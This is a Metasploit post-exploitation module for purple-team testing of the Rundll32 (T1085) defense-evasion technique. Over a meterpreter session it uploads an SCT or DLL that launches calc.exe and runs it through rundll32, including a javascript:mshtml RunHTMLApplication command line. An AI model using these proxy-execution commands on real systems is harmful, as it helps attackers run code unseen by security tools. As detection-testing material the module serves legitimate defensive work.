##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Rundll32 (T1085) Windows - Purple Team',
        'Description'   => %q{
            Defense Evasion, Execution:
            The rundll32.exe program can be called to execute an arbitrary binary.
            Adversaries may take advantage of this functionality to proxy execution
            of code to avoid triggering security tools that may not monitor execution
            of the rundll32.exe process because of whitelists or false positives from
            Windows using rundll32.exe for normal operations.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1085' ],
        [ 'URL', 'https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml'] ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        # TODO: download and execute?
        OptString.new('METHOD', [true, 'Method of execution. 1=SCT, 2=DLL.', '1'] ),
        OptBool.new('CLEANUP', [false, 'Delete files after execution and kill the calc process', true])
      ])
  end

  def run
    begin
      raise 'Module requires meterpreter session' unless session.type == 'meterpreter'

      # kill calc
      kill_calc

      if datastore['METHOD'] == '1'
        t1085_sct()
      elsif datastore['METHOD'] == '2'
        t1085_dll()
      else
        raise 'Invalid execution method option.'
      end

      print_good("Module T1085W execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1085W execution failed.")
    end
  end

  def t1085_sct
  # Execution method 1
  # Upload an SCT from /msf/data/purple/t1085 to launch calc.exe

    # upload file
    local_file_path = ::Msf::Config.data_directory + '/purple/t1085/t1085.sct'
    remote_file_path = "C:\\t1085.sct"
    print_status("Uploading #{local_file_path} to #{remote_file_path}")
    upload_file(remote_file_path, local_file_path)

    # run it
    # for some reason we can't do #{remote_file_path} in this command when specifying the script
    # if we do, the command will time out and a 'file not found' error appears on host
    cmd = "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";GetObject(\"script:C:\\\\t1085.sct\").Exec();window.close();"

    run_cmd(cmd, false)

    # check for running calc
    sleep(2)
    kill_calc(true)

    if datastore['CLEANUP']
      register_files_for_cleanup(remote_file_path)
    end


  end

  def t1085_dll
  # Execution method 2
  # Upload a DLL from /msf/data/purple/t1085 to launch calc.exe

    # upload file
    local_file_path = ::Msf::Config.data_directory + '/purple/t1085/t1085_' + (client.arch == ARCH_X86 ? 'x86.dll' : 'x64.dll')
    remote_file_path = 'C:\\t1085.dll'
    print_status("Uploading #{local_file_path} to #{remote_file_path}")
    upload_file(remote_file_path, local_file_path)

    # run it
    cmd = "rundll32.exe #{remote_file_path},EntryPoint"
    run_cmd(cmd, false)

    # check for running calc
    print_status("Sleeping 2 seconds, then checking for calc...")
    sleep(2)
    kill_calc(true)

    if datastore['CLEANUP']
      register_files_for_cleanup(remote_file_path)
    end

  end
end
